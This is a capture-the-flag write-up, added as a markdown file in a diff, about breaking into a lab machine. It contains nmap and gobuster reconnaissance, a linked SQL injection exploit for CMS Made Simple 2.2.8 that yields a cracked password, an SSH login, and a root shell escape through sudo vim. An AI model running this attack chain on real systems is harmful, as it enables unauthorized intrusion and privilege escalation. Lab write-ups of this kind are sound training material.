@@ -1,0 +1,81 @@
+I begin by scanning the IP with nmap: `nmap -sC -sV -oA ctf1/scan 10.10.75.135`
+
+```
+# Nmap 7.95 scan initiated Thu Apr 10 16:29:02 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oA ctf1/scan 10.10.75.135
+Nmap scan report for 10.10.75.135
+Host is up (0.12s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT 	STATE SERVICE VERSION
+21/tcp   open  ftp 	vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|  	Connected to ::ffff:10.6.25.18
+|  	Logged in as ftp
+|  	TYPE: ASCII
+|  	No session bandwidth limit
+|  	Session timeout in seconds is 300
+|  	Control connection is plain text
+|  	Data connections will be plain text
+|  	At session startup, client count was 2
+|  	vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http	Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 2 disallowed entries
+|_/ /openemr-5_0_1_3
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh 	OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 10 16:29:56 2025 -- 1 IP address (1 host up) scanned in 53.75 seconds
+```
+
+There are 3 ports open: 21, 80, and 2222. All of these can be useful for us when trying to think of ways to breach the system. The attack surface of this system is nice to work with - especially when one of the vectors is exploiting the insecure design.
+
+The web server this machine is hosting redirects to the default Apache webpage. But this does not necessarily indicate the site is empty, so I decided to look deeper with gobuster to see if there was anything else hidden. Gobuster is really handy and easy to use, not to mention - a very fast tool.
+
+Using this command:
+
+gobuster dir -u 10.10.75.135 -w directory-list-2.3-medium.txt -t 100
+
+Gobuster shows me that there is indeed another page with the path: /simple.
+
+Navigating to /simple brings me to a website called CMS Made Simple. The version is 2.2.8. The version of the website out in the open like this makes my job a lot easier when trying to find exploits that will work.
+
+﻿﻿
+After a quick Google search, I was able to find that this version of CMS Made Simple is vulnerable to a SQL injection exploit (CVE-2019-9053).
+
+https://www.exploit-db.com/exploits/46635
+
+This SQLi Python script extracts the hashed password and cracks it, enabling access to the target system. The results were:
+
+```
+Username: mitch
+Email: admin@admin.com
+Password: 0c01f4468bd75d7a84c7eb73846e8d96
+Cracked Password: secret
+```
+
+Now I am able to ssh into mitch's computer using: `ssh mitch@10.10.75.135 -p 2222` with the password:
+
+Once inside, the User flag: user.txt is readily available for me to capture. Easy! 
+
+My next order of business is to see what sudo commands the users here can run. Using `sudo -l`, I am able to see that Mitch is able to run /usr/bin/vim as a root user without a password. 
+
+After looking online, I found out that Vim can be used to break out of restricted environments by spawning an interactive system shell. This is a huge vulnerability and gives us the ability to escalate our privileges to become the root user - with this simple command: `sudo vim -c ':!/bin/sh'`.
+
+
+
+There you go - I have achieved privilege escalation. After navigating to the root directory, I was able to finally find the root flag:
+
+
+
+Whoever is running this website needs to seriously work on the security!
